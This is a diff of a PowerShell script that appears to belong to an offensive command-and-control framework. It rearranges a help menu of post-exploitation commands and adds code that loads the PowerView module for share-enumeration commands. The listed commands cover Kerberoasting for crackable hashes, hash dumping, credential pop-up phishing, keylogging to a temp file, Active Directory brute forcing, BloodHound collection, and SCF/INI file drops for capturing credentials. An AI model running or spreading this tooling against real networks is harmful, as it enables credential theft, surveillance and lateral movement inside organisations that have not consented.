@@ -485,34 +485,37 @@ $header = '
         write-host " Add-ObjectACL -TargetSamAccountName arobbins -PrincipalSamAccountName harmj0y -Rights ResetPassword" -ForegroundColor Green
         write-host " Get-Netuser -admincount | select samaccountname" -ForegroundColor Green
         write-host " Get-Netgroup -admincount | select samaccountname" -ForegroundColor Green
-        write-host " Get-NetGroupMember "Domain Admins" -recurse|select membername" -ForegroundColor Green
+        write-host " Get-NetGroupMember `"Domain Admins`" -recurse|select membername" -ForegroundColor Green
+        write-host ' Get-NetComputer | Select-String -pattern "Citrix" ' -ForegroundColor Green 
+        write-host ' Get-NetComputer -filter operatingsystem=*7*|select name' -ForegroundColor Green 
+        write-host ' Get-NetComputer -filter operatingsystem=*2008*|select name' -ForegroundColor Green 
+        write-host " Get-DomainComputer -LDAPFilter `"(|(operatingsystem=*7*)(operatingsystem=*2008*))`" -SPN `"wsman*`" -Properties dnshostname,serviceprincipalname,operatingsystem,distinguishedname | fl" -ForegroundColor Green
+        write-host ' Get-NetGroup | Select-String -pattern "Internet" ' -ForegroundColor Green
         write-host ' Get-NetUser -Filter | Select-Object samaccountname,userprincipalname' -ForegroundColor Green 
         write-host ' Get-NetUser -Filter samaccountname=test' -ForegroundColor Green 
         write-host ' Get-NetUser -Filter userprinciplename=test@test.com' -ForegroundColor Green 
         write-host ' Get-NetGroup | select samaccountname' -ForegroundColor Green
         write-host ' Get-NetGroup "*BEN*" | select samaccountname ' -ForegroundColor Green
         write-host ' Get-NetGroupMember "Domain Admins" -recurse|select membername' -ForegroundColor Green
+        write-host ' Get-NetShare Hostname' -ForegroundColor Green
+        write-host " Invoke-ShareFinder -Verbose -CheckShareAccess" -ForegroundColor Green
         write-host `n "Domain Trusts: " -ForegroundColor Green
         write-host "==================" -ForegroundColor Red
         write-host " Get-NetDomain | Get-NetDomainController | Get-NetForestDomain" -ForegroundColor Green 
         write-host " Invoke-MapDomainTrust" -ForegroundColor Green 
         write-host ' Get-NetUser -domain child.parent.com -Filter samaccountname=test' -ForegroundColor Green 
         write-host ' Get-NetGroup -domain child.parent.com | select samaccountname' -ForegroundColor Green 
-        write-host `n "Other Network Tasks: " -ForegroundColor Green
+        write-host `n "Domain / Network Tasks: " -ForegroundColor Green
         write-host "==================" -ForegroundColor Red
-        write-host ' Get-NetComputer | Select-String -pattern "Citrix" ' -ForegroundColor Green 
-        write-host ' Get-NetGroup | Select-String -pattern "Internet" ' -ForegroundColor Green
         write-host " Invoke-BloodHound -CollectionMethod 'Stealth' -CSVFolder C:\temp\" -ForegroundColor Green
         write-host " Get-NetDomainController | Select name | get-netsession | select *username,*CName" -ForegroundColor Green
         write-host " Get-DFSshare | get-netsession | Select *username,*CName" -ForegroundColor Green
         write-host " Get-NetFileServer | get-netsession | Select *username,*CName" -ForegroundColor Green
         write-host " Invoke-Kerberoast -AdminCount -OutputFormat HashCat|Select-Object -ExpandProperty hash" -ForegroundColor Green
-        write-host " Get-DomainComputer -LDAPFilter `"(|(operatingsystem=*7*)(operatingsystem=*2008*))`" -SPN `"wsman*`" -Properties dnshostname,serviceprincipalname,operatingsystem,distinguishedname | fl" -ForegroundColor Green
         write-host " Write-SCFFile -IPaddress 127.0.0.1 -Location \\localhost\c$\temp\" -ForegroundColor Green
         write-host " Write-INIFile -IPaddress 127.0.0.1 -Location \\localhost\c$\temp\" -ForegroundColor Green
         write-host ' Get-NetGroup | Select-String -pattern "Internet" ' -ForegroundColor Green
         write-host " Invoke-Hostscan -IPRangeCIDR 172.16.0.0/24 (Provides list of hosts with 445 open)" -ForegroundColor Green
-        write-host " Invoke-ShareFinder -hostlist hosts.txt" -ForegroundColor Green
         write-host " Get-NetFileServer -Domain testdomain.com" -ForegroundColor Green
         write-host " Find-InterestingFile -Path \\SERVER\Share -OfficeDocs -LastAccessTime (Get-Date).AddDays(-7)" -ForegroundColor Green
         write-host " Brute-AD" -ForegroundColor Green 
@@ -564,7 +567,6 @@ $header = '
         write-host " Cred-Popper" -ForegroundColor Green 
         write-host " Hashdump" -ForegroundColor Green 
         write-host ' Get-Keystrokes -LogPath "$($Env:TEMP)\key.log"' -ForegroundColor Green
-        write-host " Invoke-Portscan -Hosts 192.168.1.1/24 -T 4 -TopPorts 25" -ForegroundColor Green
         write-host " Invoke-UserHunter -StopOnSuccess" -ForegroundColor Green
         write-host " Migrate-x64" -ForegroundColor Green
         write-host " Migrate-x64 -ProcID 4444" -ForegroundColor Green
@@ -1393,7 +1395,11 @@ param
             }
             if ($pscommand.ToLower().StartsWith('invoke-sharefinder'))
             { 
-                CheckModuleLoaded "invoke-sharefinder.ps1" $psrandomuri
+                CheckModuleLoaded "PowerView.ps1" $psrandomuri
+            }
+            if ($pscommand.ToLower().StartsWith('get-netshare'))
+            { 
+                CheckModuleLoaded "PowerView.ps1" $psrandomuri
             }
             if ($pscommand.ToLower().StartsWith('invoke-dcsync'))
             { 
